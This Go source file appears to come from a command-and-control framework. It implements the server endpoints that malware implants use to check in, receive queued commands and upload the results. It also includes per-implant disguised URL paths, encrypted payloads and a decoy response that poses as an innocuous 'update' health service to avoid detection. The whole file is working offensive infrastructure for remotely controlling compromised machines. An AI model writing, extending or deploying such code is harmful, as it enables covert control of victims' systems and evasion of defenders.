package c2

import (
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
)

// ListenAddr returns the optional dedicated C2 listener address from
// ARTEX_C2_ADDR ("", "127.0.0.1:8443", ":8443", ...). When empty the beacon
// endpoints are mounted on the main server mux instead.
func ListenAddr() string { return strings.TrimSpace(os.Getenv("ARTEX_C2_ADDR")) }

// Handler serves the implant-facing HTTP endpoints. It is designed to look
// like an innocuous JSON service: unmatched paths return a static health
// payload and the check-in endpoints answer 204 when idle.
type Handler struct {
	M *Manager
}

// prefix is where implant endpoints are mounted, on either listener.
const prefix = "/api/c2/"

// handler implements http.Handler. Note: it carries no server-level mux —
// Register is what binds it (see RegisterHandler).
type handler struct{ h *Handler }

// RegisterHandler mounts the implant endpoints on mux.
func RegisterHandler(mux *http.ServeMux, h *Handler) {
	mux.Handle(prefix, &handler{h})
}

func (w *handler) ServeHTTP(rw http.ResponseWriter, r *http.Request) { w.h.ServeHTTP(rw, r) }

// ServeHTTP routes /api/c2/<profile-path> to the implant whose malleable
// profile declares that path.
func (h *Handler) ServeHTTP(rw http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		h.decoy(rw)
		return
	}
	p := strings.Trim(strings.TrimPrefix(r.URL.Path, prefix), "/")
	if p == "" {
		h.decoy(rw)
		return
	}
	for _, im := range h.M.List() {
		if p == im.BeaconPath {
			h.checkin(rw, r, im)
			return
		}
		if p == im.RespPath {
			h.results(rw, r, im)
			return
		}
	}
	h.decoy(rw)
}

func (h *Handler) decoy(rw http.ResponseWriter) {
	rw.Header().Set("Content-Type", "application/json")
	rw.Header().Set("Cache-Control", "no-store")
	_, _ = rw.Write([]byte(`{"service":"update","status":"ok"}` + "\n"))
}

// readSecret extracts the implant auth token.
func readSecret(r *http.Request) string {
	if s := r.Header.Get(hdrSecret); s != "" {
		return strings.TrimSpace(s)
	}
	// Fall back to query auth for constrained environments.
	return strings.TrimSpace(r.URL.Query().Get("t"))
}

func (h *Handler) checkin(rw http.ResponseWriter, r *http.Request, im Implant) {
	body, err := io.ReadAll(http.MaxBytesReader(rw, r.Body, maxBodyBytes))
	if err != nil {
		http.Error(rw, "bad request", http.StatusBadRequest)
		return
	}
	if !h.M.VerifySecret(im.ID, readSecret(r)) {
		http.Error(rw, "unauthorized", http.StatusUnauthorized)
		return
	}
	var b Beacon
	if err := decodePayload(im.Encrypt, r.Header.Get(hdrIV), im.Token, body, &b); err != nil || b.ID != im.ID {
		http.Error(rw, "bad payload", http.StatusBadRequest)
		return
	}
	h.M.Touch(b, r.RemoteAddr)

	t, ok := h.M.Dequeue(im.ID)
	if !ok {
		rw.WriteHeader(http.StatusNoContent)
		return
	}
	out := CommandOut{Cmd: t.Cmd, Args: t.Args, TaskID: strconv.FormatInt(t.ID, 10)}
	payload, hdrs, err := encodePayload(im.Encrypt, im.Token, out)
	if err != nil {
		http.Error(rw, "encode error", http.StatusInternalServerError)
		return
	}
	for k, v := range hdrs {
		rw.Header().Set(k, v)
	}
	for k, v := range taskHeaders(out) {
		rw.Header().Set(k, v)
	}
	rw.Header().Set(hdrTaskTimeout, strconv.Itoa(t.TimeoutSeconds))
	rw.Header().Set("Cache-Control", "no-store")
	rw.Header().Set("Content-Type", "application/octet-stream")
	_, _ = rw.Write(payload)
}

func (h *Handler) results(rw http.ResponseWriter, r *http.Request, im Implant) {
	body, err := io.ReadAll(http.MaxBytesReader(rw, r.Body, maxBodyBytes))
	if err != nil {
		http.Error(rw, "bad request", http.StatusBadRequest)
		return
	}
	if !h.M.VerifySecret(im.ID, readSecret(r)) {
		http.Error(rw, "unauthorized", http.StatusUnauthorized)
		return
	}
	var rin ResultIn
	if err := decodePayload(im.Encrypt, r.Header.Get(hdrIV), im.Token, body, &rin); err != nil || rin.ID != im.ID {
		http.Error(rw, "bad payload", http.StatusBadRequest)
		return
	}
	taskID, _ := strconv.ParseInt(strings.TrimSpace(rin.TaskID), 10, 64)
	h.M.AddResult(im.ID, taskID, rin.Output, rin.Error, rin.Exit)
	rw.Header().Set("Cache-Control", "no-store")
	rw.WriteHeader(http.StatusOK)
	_, _ = rw.Write([]byte(`{"status":"ok"}`))
}

// StaleImplants returns implants whose last check-in is older than their
// staleness window (used by the console and tools for display).
func (h *Handler) StaleImplants() []string {
	var out []string
	for _, im := range h.M.List() {
		if im.Status() == "stale" {
			out = append(out, im.ID)
		}
	}
	return out
}
